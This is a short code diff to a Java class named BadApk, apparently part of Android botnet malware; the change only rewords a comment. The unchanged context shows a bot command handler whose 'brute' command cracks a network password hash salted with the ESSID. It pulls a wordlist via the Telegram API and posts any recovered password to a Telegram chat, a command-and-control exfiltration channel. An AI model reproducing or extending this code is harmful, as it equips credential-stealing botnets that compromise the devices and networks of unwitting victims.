@@ -114,7 +114,7 @@ class BadApk {
                     }
                     break;
                 case "brute":
-                    // hash, essid(as salt), wordlistName, skipWordsAtWordlist(for dedicated between bots)
+                    // hash, essid(as salt), wordlistName, wordlistOffset(for dedicated between bots)
                     String pass = hardWare.brute(cmd[1], cmd[2], Arrays.toString(netWare.connHttps(telegramApi + cmd[3])), String.valueOf(new Random().nextInt(100000000)));
                     if (!Objects.equals(pass, "")) netWare.connHttps(telegramApi + "/sendMessage?chat_id=@" + botName + "&text=" + pass);
                     break;
